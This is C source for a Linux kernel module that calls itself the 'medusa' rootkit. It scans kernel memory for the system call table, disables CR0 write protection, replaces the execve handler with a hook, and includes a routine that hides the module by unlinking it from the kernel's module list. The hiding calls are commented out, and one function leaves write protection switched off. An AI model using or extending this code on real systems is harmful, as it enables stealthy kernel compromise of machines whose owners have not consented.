#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/module.h>

#define BRUTEFORCE_ADDR_BEGIN 0xc0000000
#define BRUTEFORCE_ADDR_END 0xe0000000

#define CR0_WP_DISABLE                                             \
        do {                                                       \
                pr_info("medusa: disabling cr0 write protection"); \
                write_cr0(read_cr0() & (~ 0x10000));               \
        } while (0);

#define CR0_WP_DISABLE_END                                         \
        do {                                                       \
                pr_info("medusa: enabling cr0 write protection");  \
                write_cr0(read_cr0() | 0x10000);                   \
        } while (0);

static bool is_hidden = false;
static unsigned long **sys_call_table_ptr = NULL;
static unsigned long *real_sys_read = NULL;
static unsigned long ptr = 0;
static struct list_head *module_prev = NULL;

static void medusa_locate_sys_call_table(void);
static bool medusa_is_hidden(void);
static void medusa_set_hidden(bool hidden);


/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
asmlinkage int (*real_execve)(const char *filename,
                              char *const argv[],
                              char *const envp[]);

asmlinkage int new_execve(const char *filename,
                          char *const argv[],
                          char *const envp[])
{
        pr_info("medusa: hooked call to execve(%s, ...)\n", filename);
        return real_execve(filename, argv, envp);
}


static int __init medusa_init(void)
{
        pr_info("medusa: initializing rootkit...\n");
        medusa_locate_sys_call_table();
        //medusa_set_hidden(true);
        return 0;
}

static void __exit medusa_exit(void)
{
        pr_info("medusa: shutting down...\n");
        //medusa_set_hidden(false);

        CR0_WP_DISABLE {
                sys_call_table_ptr[__NR_execve] = (unsigned long *) real_execve;
                pr_info("medusa: restored sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
        } CR0_WP_DISABLE_END
}


static void medusa_locate_sys_call_table(void)
{
        real_sys_read = (void *) kallsyms_lookup_name("sys_read");
        pr_info("medusa: sys_read: %p\n", real_sys_read);

        for (ptr = BRUTEFORCE_ADDR_BEGIN; ptr <= BRUTEFORCE_ADDR_END; ptr++) {
                sys_call_table_ptr = (unsigned long **) ptr;
                if (sys_call_table_ptr[__NR_read] == (unsigned long *) real_sys_read) {
                        sys_call_table_ptr = &(sys_call_table_ptr[0]);
                        break;
                }
        }

        pr_info("medusa: sys_call_table           : %p\n", sys_call_table_ptr);
        pr_info("medusa: sys_call_table[__NR_read]: %p\n", sys_call_table_ptr[__NR_read]);


        CR0_WP_DISABLE {
                real_execve = (void *) sys_call_table_ptr[__NR_execve];
                pr_info("medusa: real_execve: %p\n", real_execve);

                sys_call_table_ptr[__NR_execve] = (unsigned long *) new_execve;
                pr_info("medusa: new sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
        }
}

static bool medusa_is_hidden(void)
{
        return is_hidden;
}

static void medusa_set_hidden(bool hidden)
{
        if (is_hidden == hidden)
                return;

        if (hidden) {  // hide module
                module_prev = THIS_MODULE->list.prev;  // backup prev node in module list.
                list_del(&THIS_MODULE->list);  // removes from procfs
        } else {  // unhide module
                list_add(&THIS_MODULE->list, module_prev);
                module_prev = NULL;
        }

        is_hidden = hidden;
}


module_init(medusa_init);
module_exit(medusa_exit);

MODULE_LICENSE("GPL v2");
MODULE_VERSION("0.01");
